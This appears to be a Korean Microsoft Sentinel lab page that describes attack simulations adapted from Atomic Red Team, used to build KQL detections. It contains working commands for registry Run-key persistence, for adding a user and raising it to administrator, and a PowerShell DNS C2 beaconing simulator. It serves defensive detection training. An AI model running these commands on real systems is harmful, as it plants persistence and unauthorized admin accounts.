---
lab:
    title: '연습 4 - 검색 모델링 이해'
    module: '모듈 7 - Microsoft Sentinel을 사용하여 검색 만들기 및 조사 수행'
---

# 모듈 7 - 랩 1 - 연습 4 - 검색 모델링 이해

### 작업 1: 공격 이해

**중요: 이 연습에서는 특별한 작업을 수행하지 않으며**  여기에 나오는 지침은 다음 연습에서 수행하게 될 공격에 대한 설명입니다. 이 페이지의 내용을 주의하여 읽어보세요.

이 공격의 패턴은 오픈 소스 프로젝트 https://github.com/redcanaryco/atomic-red-team 을 토대로 작성된 것입니다.

>**참고:** 랩을 진행하기 위해 짧은 시간 내에 트리거되는 설정도 있습니다.

#### 공격 1 - 레지스트리 키 추가를 통한 지속성 적용

이 공격은 명령 프롬프트에서 실행합니다.

```Command
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "SOC Test" /t REG_SZ /F /D "C:\temp\startup.bat"
```

#### 공격 2 - 사용자 추가 및 권한 상승

이 공격에서는 공격자가 새 사용자를 추가한 다음 권한을 Administrators 그룹으로 높입니다.  그러면 권한이 있는 다른 계정으로 로그온할 수 있게 됩니다.

```Command
net user theusernametoadd /add
net user theusernametoadd ThePassword1!
net localgroup administrators theusernametoadd /add
```

### 공격 3 - DNS/C2 

이 공격에서는 C2(명령 및 제어) 통신을 시뮬레이트합니다.

```PowerShell
param(
    [string]$Domain = "microsoft.com",
    [string]$Subdomain = "subdomain",
    [string]$Sub2domain = "sub2domain",
    [string]$Sub3domain = "sub3domain",
    [string]$QueryType = "TXT",
        [int]$C2Interval = 8,
        [int]$C2Jitter = 20,
        [int]$RunTime = 240
)
$RunStart = Get-Date
$RunEnd = $RunStart.addminutes($RunTime)
$x2 = 1
$x3 = 1 
Do {
    $TimeNow = Get-Date
    Resolve-DnsName -type $QueryType $Subdomain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
    if ($x2 -eq 3 )
    {
        Resolve-DnsName -type $QueryType $Sub2domain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
        $x2 = 1
    }
    else
    {
        $x2 = $x2 + 1
    }
    if ($x3 -eq 7 )
    {
        Resolve-DnsName -type $QueryType $Sub3domain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
        $x3 = 1
    }
    else
    {
        $x3 = $x3 + 1
    }
    $Jitter = ((Get-Random -Minimum -$C2Jitter -Maximum $C2Jitter) / 100 + 1) +$C2Interval
    Start-Sleep -Seconds $Jitter
}
Until ($TimeNow -ge $RunEnd)
```


### 작업 2: 검색 모델링 이해

이 랩에서 사용하는 공격 검색 구성 주기에는 모든 데이터 원본이 포함됩니다. 하지만 실제로는 두 가지 데이터 원본만 중점적으로 검색합니다.

검색을 작성하려면 먼저 KQL 문을 작성해야 합니다.  여기서는 호스트를 공격할 것이므로 KQL 문 작성을 시작하는 데 필요한 대표 데이터가 제공됩니다.

다음 랩에서는 엔드포인트용 Defender 및 Sysmon 포함 Windows가 설치된 Windows 호스트에서 동일한 공격을 실행합니다.  검색을 작성하는 과정에서 각 문의 데이터 정규화 방식 차이를 확인할 수 있습니다.

KQL 문을 완성한 후에는 분석 규칙을 만듭니다.

규칙이 트리거되어 경고와 인시던트가 생성되면 조사를 진행하여 보안 운영 분석자의 조사 과정에 도움이 되는 필드가 제공되고 있는지를 확인합니다.

그리고 나서 필요에 따라 분석 규칙의 다른 부분을 변경합니다.

# 연습 5 계속 진행
